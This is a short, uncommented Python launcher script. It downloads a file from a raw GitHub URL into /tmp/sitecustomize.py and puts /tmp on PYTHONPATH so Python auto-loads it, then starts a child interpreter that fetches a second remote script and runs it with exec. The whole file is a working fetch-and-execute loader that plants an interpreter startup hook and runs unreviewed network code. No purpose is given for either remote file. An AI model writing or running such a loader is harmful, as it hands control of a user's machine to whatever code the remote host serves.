import os
import subprocess
import sys
import urllib.request

print("ND_RUNTIME_RETIREMENT_ENTRY_V5", flush=True)
urllib.request.urlretrieve("https://raw.githubusercontent.com/namelessdhamma/namelessdhamma.github.io/eaee6796c4571dbd5aeed2b182c71ec83778688d/tmp/nd_runtime_retirement_sitecustomize_v3.py", "/tmp/sitecustomize.py")
env = dict(os.environ)
env["PYTHONPATH"] = "/tmp" + ((":" + env["PYTHONPATH"]) if env.get("PYTHONPATH") else "")
child_code = """import urllib.request
src = urllib.request.urlopen("https://raw.githubusercontent.com/namelessdhamma/namelessdhamma.github.io/2701b7887aec4524b81dd827cce3695795de3aff/tmp/nd_tiktok_front_v01.py", timeout=30).read().decode("utf-8")
exec(compile(src, "nd_tiktok_front_v01.py", "exec"))
"""
raise SystemExit(subprocess.call([sys.executable, "-u", "-c", child_code], env=env))
